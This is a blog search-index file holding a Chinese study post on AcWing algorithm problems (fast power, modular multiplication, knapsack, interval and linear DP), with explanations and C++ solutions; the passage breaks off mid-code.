<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>acwing算法进阶指南打卡</title>
    <link href="/post/acwing%E7%AE%97%E6%B3%95%E8%BF%9B%E9%98%B6%E6%8C%87%E5%8D%97%E6%89%93%E5%8D%A1.html"/>
    <url>/post/acwing%E7%AE%97%E6%B3%95%E8%BF%9B%E9%98%B6%E6%8C%87%E5%8D%97%E6%89%93%E5%8D%A1.html</url>
    
    <content type="html"><![CDATA[<h1 id="0x00-基本算法"><a href="#0x00-基本算法" class="headerlink" title="0x00 基本算法"></a>0x00 基本算法</h1><h2 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h2><p>基本操作：</p><p>1.n的二进制表示中第k位数字是几</p><p>​    思路：1.先把第k位移到最后一位n&gt;&gt;k 2.看个位是几</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">(n&gt;&gt;k)&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>2.lowbit操作，返回x的最后一位1</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">x=<span class="hljs-number">101100</span> <span class="hljs-built_in">lowbit</span>(x)=<span class="hljs-number">100</span><br></code></pre></td></tr></table></figure><p>实现</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">x</span><span class="hljs-operator">=</span><span class="hljs-number">1010101000</span><br>~<span class="hljs-keyword">x</span><span class="hljs-number">+1</span><span class="hljs-operator">=</span><span class="hljs-number">0101011000</span><br><span class="hljs-keyword">x</span>&amp;(-<span class="hljs-keyword">x</span>)<span class="hljs-operator">=</span><span class="hljs-keyword">x</span>&amp;(~<span class="hljs-keyword">x</span><span class="hljs-number">+1</span>)<span class="hljs-operator">=</span><span class="hljs-number">0000001000</span><br></code></pre></td></tr></table></figure><h3 id="89-a-b"><a href="#89-a-b" class="headerlink" title="89.a^b"></a>89.a^b</h3><p>求 a 的 b 次方对 p 取模的值。</p><h4 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h4><p>三个整数 a,b,p在同一行用空格隔开。</p><h4 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h4><p>输出一个整数，表示<code>a^b mod p</code>的值。</p><h4 id="数据范围"><a href="#数据范围" class="headerlink" title="数据范围"></a>数据范围</h4><p>0≤a,b≤10^9<br>1≤p≤10^9</p><h4 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">3 </span><span class="hljs-number">2</span> <span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><h4 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">2<br></code></pre></td></tr></table></figure><h4 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h4><p>快速幂</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">7</span>^<span class="hljs-number">14</span>=<span class="hljs-number">7</span>^(<span class="hljs-number">1110</span>)<span class="hljs-number">2</span>=<span class="hljs-number">7</span>^(<span class="hljs-number">1000</span>)<span class="hljs-number">2</span> *<span class="hljs-number">7</span>^(<span class="hljs-number">100</span>)<span class="hljs-number">2</span> *<span class="hljs-number">7</span>^(<span class="hljs-number">10</span>)<span class="hljs-number">2</span>=<span class="hljs-number">7</span>^<span class="hljs-number">8</span>*<span class="hljs-number">7</span>^<span class="hljs-number">4</span>*<span class="hljs-number">7</span>^<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202303211114495.png" alt="image-20230321111432450"></p><h4 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//快速幂</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">//注意数据大小</span><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> a,b,p;<br>    cin&gt;&gt;a&gt;&gt;b&gt;&gt;p;<br>    a=a%p;<br>    <span class="hljs-type">int</span> ans=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span>(b&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">if</span>(b&amp;<span class="hljs-number">1</span>)<br>            ans=(ans*a)%p;<br>        a=(a*a)%p;<br>        b=b&gt;&gt;<span class="hljs-number">1</span>;<br>    &#125;<br>    cout&lt;&lt;ans%p&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="90-64位整数乘法"><a href="#90-64位整数乘法" class="headerlink" title="90.64位整数乘法"></a>90.64位整数乘法</h3><p>求 a 乘 b 对 p 取模的值。</p><h4 id="输入格式-1"><a href="#输入格式-1" class="headerlink" title="输入格式"></a>输入格式</h4><p>第一行输入整数a，第二行输入整数b，第三行输入整数p。</p><h4 id="输出格式-1"><a href="#输出格式-1" class="headerlink" title="输出格式"></a>输出格式</h4><p>输出一个整数，表示<code>a*b mod p</code>的值。</p><h4 id="数据范围-1"><a href="#数据范围-1" class="headerlink" title="数据范围"></a>数据范围</h4><p>1≤a,b,p≤10^18</p><h4 id="输入样例：-1"><a href="#输入样例：-1" class="headerlink" title="输入样例："></a>输入样例：</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">3<br>4<br>5<br></code></pre></td></tr></table></figure><h4 id="输出样例：-1"><a href="#输出样例：-1" class="headerlink" title="输出样例："></a>输出样例：</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">2<br></code></pre></td></tr></table></figure><h4 id="思路：-1"><a href="#思路：-1" class="headerlink" title="思路："></a>思路：</h4><p>这里的数据范围比较大，如果a,b直接相乘的话没有相应的数据结构能够存储，可以转换成加法，而且可以用到快速幂中的思想</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">a*b<br>--&gt;a+a+a...+<span class="hljs-built_in">a</span> (b个a)<br>--&gt;a+<span class="hljs-number">2</span>a+<span class="hljs-number">4</span>a...(logb个a)<br></code></pre></td></tr></table></figure><h4 id="代码"><a href="#代码" class="headerlink" title="代码:"></a>代码:</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//快速幂</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> ULL;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">//注意数据大小</span><br>    ULL a,b,p;<br>    cin&gt;&gt;a&gt;&gt;b&gt;&gt;p;<br>    a=a%p;<br>    ULL ans=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(b&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">if</span>(b&amp;<span class="hljs-number">1</span>)<br>            ans=(ans+a)%p;<br>        a=(a+a)%p;<br>        b=b&gt;&gt;<span class="hljs-number">1</span>;<br>    &#125;<br>    cout&lt;&lt;ans%p&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x50-动态规划"><a href="#0x50-动态规划" class="headerlink" title="0x50 动态规划"></a>0x50 动态规划</h1><h2 id="背包"><a href="#背包" class="headerlink" title="背包"></a>背包</h2><h3 id="278-数字组合"><a href="#278-数字组合" class="headerlink" title="278.数字组合"></a>278.数字组合</h3><p>给定 N 个正整数 A1,A2,…,AN，从中选出若干个数，使它们的和为 M，求有多少种选择方案。</p><h4 id="输入格式-2"><a href="#输入格式-2" class="headerlink" title="输入格式"></a>输入格式</h4><p>第一行包含两个整数 N 和 M。</p><p>第二行包含 N 个整数，表示 A1,A2,…,AN。</p><h4 id="输出格式-2"><a href="#输出格式-2" class="headerlink" title="输出格式"></a>输出格式</h4><p>包含一个整数，表示可选方案数。</p><h4 id="数据范围-2"><a href="#数据范围-2" class="headerlink" title="数据范围"></a>数据范围</h4><p>1≤N≤100<br>1≤M≤10000<br>1≤Ai≤1000<br>答案保证在 int 范围内。</p><h4 id="输入样例：-2"><a href="#输入样例：-2" class="headerlink" title="输入样例："></a>输入样例：</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">4 </span><span class="hljs-number">4</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><h4 id="输出样例：-2"><a href="#输出样例：-2" class="headerlink" title="输出样例："></a>输出样例：</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">3<br></code></pre></td></tr></table></figure><h4 id="思路：-2"><a href="#思路：-2" class="headerlink" title="思路："></a>思路：</h4><p>01背包问题</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">f[j]=f[j]+f[j-v[i]]<br></code></pre></td></tr></table></figure><p>关键：f[0]=1(初始当总体积为0是只有不放一种方案)</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202303172120448.jpg" alt="img"></p><h4 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> M=<span class="hljs-number">10010</span>;<br><br><span class="hljs-type">int</span> f[M];<br><span class="hljs-type">int</span> n,m;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    cin&gt;&gt;n&gt;&gt;m;<br>    f[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span>(n--)&#123;<br>        <span class="hljs-type">int</span> v;<br>        cin&gt;&gt;v;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=m;j&gt;=v;j--)&#123;<br>            f[j]+=f[j-v];<br>        &#125;<br>    &#125;<br>    <br>    cout&lt;&lt;f[m];<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="279-自然数拆分"><a href="#279-自然数拆分" class="headerlink" title="279.自然数拆分"></a>279.自然数拆分</h3><p>给定一个自然数 N，要求把 N 拆分成若干个正整数相加的形式，参与加法运算的数可以重复。</p><p><strong>注意</strong>:</p><ul><li>拆分方案不考虑顺序；</li><li>至少拆分成 2 个数的和。</li></ul><p>求拆分的方案数 mod2147483648 的结果。</p><h4 id="输入格式-3"><a href="#输入格式-3" class="headerlink" title="输入格式"></a>输入格式</h4><p>一个自然数 N。</p><h4 id="输出格式-3"><a href="#输出格式-3" class="headerlink" title="输出格式"></a>输出格式</h4><p>输入一个整数，表示结果。</p><h4 id="数据范围-3"><a href="#数据范围-3" class="headerlink" title="数据范围"></a>数据范围</h4><p>1≤N≤40001≤N≤4000</p><h4 id="输入样例：-3"><a href="#输入样例：-3" class="headerlink" title="输入样例："></a>输入样例：</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">7<br></code></pre></td></tr></table></figure><h4 id="输出样例：-3"><a href="#输出样例：-3" class="headerlink" title="输出样例："></a>输出样例：</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">14<br></code></pre></td></tr></table></figure><h4 id="思路：-3"><a href="#思路：-3" class="headerlink" title="思路："></a>思路：</h4><p>数可以多次使用，故是完全背包问题</p><p>但这种求方案数初始化为多少，一直不太明白，似乎一般都初始化为1，将什么都不选视为一种方案（还是不太理解</p><p>大佬的总结：</p><p><a href="https://blog.csdn.net/weixin_45724872/article/details/119061764">https://blog.csdn.net/weixin_45724872/article/details/119061764</a></p><p>还要注意这题的v[i]即是i</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++">f[i][j]=f[i<span class="hljs-number">-1</span>][j]+f[i<span class="hljs-number">-1</span>][j-k*v[i]];(k=<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2.</span>..)<br>-&gt;f[i][j]=f[i<span class="hljs-number">-1</span>][j]+f[i<span class="hljs-number">-1</span>][j-v]+f[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-2</span>v]...+f[i<span class="hljs-number">-1</span>][j-sv]<br>-&gt;f[i][j-v]=f[i<span class="hljs-number">-1</span>][j-v]+f[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-2</span>v]...+f[i<span class="hljs-number">-1</span>][j-sv]<br>---&gt;f[i][j]=f[i<span class="hljs-number">-1</span>][j]+f[i][j-v]<br>----&gt;f[j]=f[j]+f[j-v]<br></code></pre></td></tr></table></figure><h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码:"></a>代码:</h4><p>一维</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">4010</span>,mod=<span class="hljs-number">2147483648</span>;<br><br><span class="hljs-type">long</span> <span class="hljs-type">long</span> f[N];<br><span class="hljs-type">int</span> n;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    cin&gt;&gt;n;<br>    <br>    f[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>;<br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n<span class="hljs-number">-1</span>;i++)<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=i;j&lt;=n;j++) <span class="hljs-comment">//这里一定要从i开始，保证j&gt;=i</span><br>        &#123;<br>                f[j]+=f[j-i];<br>                f[j]%=mod;<br>        &#125;<br>            <br>    cout&lt;&lt;f[n];<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="区间DP"><a href="#区间DP" class="headerlink" title="区间DP"></a>区间DP</h2><h3 id="282-石子合并"><a href="#282-石子合并" class="headerlink" title="282.石子合并"></a>282.石子合并</h3><p>设有 N 堆石子排成一排，其编号为 1,2,3,…,N。</p><p>每堆石子有一定的质量，可以用一个整数来描述，现在要将这 N 堆石子合并成为一堆。</p><p>每次只能合并相邻的两堆，合并的代价为这两堆石子的质量之和，合并后与这两堆石子相邻的石子将和新堆相邻，合并时由于选择的顺序不同，合并的总代价也不相同。</p><p>例如有 4 堆石子分别为 1 3 5 2， 我们可以先合并 1、2 堆，代价为 4，得到 4 5 2， 又合并 1、2 堆，代价为 9，得到 9 2 ，再合并得到 11，总代价为 4+9+11=24；</p><p>如果第二步是先合并 2、3 堆，则代价为 7，得到 4 7，最后一次合并代价为 11，总代价为 4+7+11=22。</p><p>问题是：找出一种合理的方法，使总的代价最小，输出最小代价。</p><p><strong>输入格式</strong><br>第一行一个数 N 表示石子的堆数 N。</p><p>第二行 N 个数，表示每堆石子的质量(均不超过 1000)。</p><p><strong>输出格式</strong><br>输出一个整数，表示最小代价。</p><p><strong>数据范围</strong><br>1≤N≤300<br><strong>输入样例</strong>：<br>4<br>1 3 5 2<br><strong>输出样例</strong>：<br>22</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202303180034993.png" alt="image-20230317184620318"></p><p><strong>代码：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">310</span>;<br><span class="hljs-type">int</span> s[N];<br><span class="hljs-type">int</span> f[N][N];<br><span class="hljs-type">int</span> n;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>cin&gt;&gt;n;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) cin&gt;&gt;s[i];<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) s[i]+=s[i<span class="hljs-number">-1</span>];<br><br><span class="hljs-comment">//遍历区间长度</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> len=<span class="hljs-number">2</span>;len&lt;=n;len++)&#123;<br><span class="hljs-comment">//遍历起点</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i+len<span class="hljs-number">-1</span>&lt;=n;i++)<br>&#123;<br><span class="hljs-type">int</span> l=i,r=i+len<span class="hljs-number">-1</span>;<br>f[l][r]=<span class="hljs-number">1e8</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=l;k&lt;r;k++)<br>&#123;<br>f[l][r]=<span class="hljs-built_in">min</span>(f[l][r],f[l][k]+f[k+<span class="hljs-number">1</span>][r]+s[r]-s[l<span class="hljs-number">-1</span>]);<br>&#125;<br>&#125;<br>&#125;<br><br>cout&lt;&lt;f[<span class="hljs-number">1</span>][n]&lt;&lt;endl;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="线性DP"><a href="#线性DP" class="headerlink" title="线性DP"></a>线性DP</h2><h3 id="271-杨老师的照相排列"><a href="#271-杨老师的照相排列" class="headerlink" title="271.杨老师的照相排列"></a>271.杨老师的照相排列</h3><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202303180050021.png" alt="image-20230318005032956"></p><h4 id="输入样例：-4"><a href="#输入样例：-4" class="headerlink" title="输入样例："></a>输入样例：</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">1</span><br><span class="hljs-number">30</span><br><span class="hljs-number">5</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span><br><span class="hljs-number">3</span><br><span class="hljs-symbol">3 </span><span class="hljs-number">2</span> <span class="hljs-number">1</span><br><span class="hljs-number">4</span><br><span class="hljs-symbol">5 </span><span class="hljs-number">3</span> <span class="hljs-number">3</span> <span class="hljs-number">1</span><br><span class="hljs-number">5</span><br><span class="hljs-symbol">6 </span><span class="hljs-number">5</span> <span class="hljs-number">4</span> <span class="hljs-number">3</span> <span class="hljs-number">2</span><br><span class="hljs-number">2</span><br><span class="hljs-symbol">15 </span><span class="hljs-number">15</span><br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h4 id="输出样例：-4"><a href="#输出样例：-4" class="headerlink" title="输出样例："></a>输出样例：</h4><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">1</span><br><span class="hljs-number">1</span><br><span class="hljs-number">16</span><br><span class="hljs-number">4158</span><br><span class="hljs-number">141892608</span><br><span class="hljs-number">9694845</span><br></code></pre></td></tr></table></figure><h4 id="思路"><a href="#思路" class="headerlink" title="思路:"></a>思路:</h4><p>参考博客：<a href="https://blog.csdn.net/qq12323qweeqwe/article/details/122526988">https://blog.csdn.net/qq12323qweeqwe/article/details/122526988</a></p><p>状态表示：f[a,b,c,d,e]<br>集合：所有第一排有a个人，第二个排有b个人…第五排有e个人的方案<br>属性：总方案数<br>状态计算：<br>从尾向头考虑，考虑我们如何安排最后一个学生。</p><p>状态计算对应集合的划分，令最后一个同学被安排在哪一排作为划分依据，可以将f[a][b][c][d][e]划分成5个不重不漏的子集：</p><ul><li>当a &gt; 0 &amp;&amp; a - 1 &gt;= b时，最后一个同学可能被安排在第1排，方案数是f[a-1][b][c][d][e]；</li><li>当b &gt; 0 &amp;&amp; b - 1 &gt;= c时，最后一个同学可能被安排在第2排，方案数是f[a][b-1][c][d][e]；</li><li>当c &gt; 0 &amp;&amp; c - 1 &gt;= d时，最后一个同学可能被安排在第3排，方案数是f[a][b][c-1][d][e]；</li><li>当d &gt; 0 &amp;&amp; d - 1 &gt;= e时，最后一个同学可能被安排在第4排，方案数是f[a][b][c][d-1][e]；</li><li>当e &gt; 0时，最后一个同学可能被安排在第5排，方案数是f[a][b][c][d][e-1]</li></ul><h4 id="代码：-2"><a href="#代码：-2" class="headerlink" title="代码："></a>代码：</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span>  std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">31</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> LL;<br><br><span class="hljs-type">int</span> n;<br>LL f[N][N][N][N][N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n),n)<br>    &#123;<br>        <span class="hljs-type">int</span> a[<span class="hljs-number">5</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++) cin&gt;&gt;a[i];<br>        <br>        <span class="hljs-built_in">memset</span>(f,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span> f);<br>        <br>        f[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>][<span class="hljs-number">0</span>][<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>;<br>        <br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=a[<span class="hljs-number">0</span>];i++)<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;=<span class="hljs-built_in">min</span>(a[<span class="hljs-number">1</span>],i);j++)<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;k&lt;=<span class="hljs-built_in">min</span>(a[<span class="hljs-number">2</span>],j);k++)<br>                    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> x=<span class="hljs-number">0</span>;x&lt;=<span class="hljs-built_in">min</span>(a[<span class="hljs-number">3</span>],k);x++)<br>                        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> y=<span class="hljs-number">0</span>;y&lt;=<span class="hljs-built_in">min</span>(a[<span class="hljs-number">4</span>],x);y++)<br>                        &#123;<br>                            LL &amp;m=f[i][j][k][x][y];<br>                            <span class="hljs-keyword">if</span>(i&amp;&amp;i<span class="hljs-number">-1</span>&gt;=j) m+=f[i<span class="hljs-number">-1</span>][j][k][x][y];<br>                            <span 